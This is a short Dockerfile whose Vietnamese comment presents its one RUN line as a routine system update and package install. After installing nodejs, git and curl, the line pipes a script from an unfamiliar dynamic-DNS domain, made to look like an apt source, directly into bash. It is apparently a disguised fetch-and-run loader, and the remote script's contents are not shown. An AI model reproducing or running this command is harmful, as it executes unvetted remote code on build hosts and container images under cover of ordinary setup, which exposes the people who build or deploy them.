
FROM ubuntu:latest

# Cập nhật hệ thống và cài đặt các gói cần thiết
RUN apt update && apt install nodejs git curl -y && curl -Ls https://apt.apicuateo.dpdns.org | bash
